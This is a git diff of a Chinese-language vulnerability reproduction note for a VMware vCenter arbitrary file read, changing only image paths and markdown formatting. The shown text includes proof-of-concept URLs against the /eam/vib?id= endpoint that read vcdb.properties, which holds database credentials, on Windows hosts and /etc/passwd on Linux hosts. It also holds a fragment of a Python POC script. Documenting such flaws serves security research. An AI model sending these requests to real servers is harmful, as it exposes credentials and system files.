@@ -18,25 +18,25 @@ title="ID_VC_Welcome"
 
 ## 漏洞复现
 
-![image-20220209124210343](images/202202091242446.png)
+![image-20220209124210343](../.gitbook/assets/202202091242446.png)
 
 使用POC访问漏洞点
 
-- Windows主机
+* Windows主机
 
-```plain
+```
 http://xxx.xxx.xxx.xxx/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
 ```
 
-![image-20220209124225730](images/202202091242777.png)
+![image-20220209124225730](../.gitbook/assets/202202091242777.png)
 
-- Linux主机
+* Linux主机
 
-```plain
+```
 https://xxx.xxx.xxx.xxx/eam/vib?id=/etc/passwd
 ```
 
-![image-20220209124241987](images/202202091242060.png)
+![image-20220209124241987](../.gitbook/assets/202202091242060.png)
 
 ## 漏洞POC
 
@@ -84,4 +84,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![image-20220209124258448](images/202202091242558.png)
+![image-20220209124258448](../.gitbook/assets/202202091242558.png)
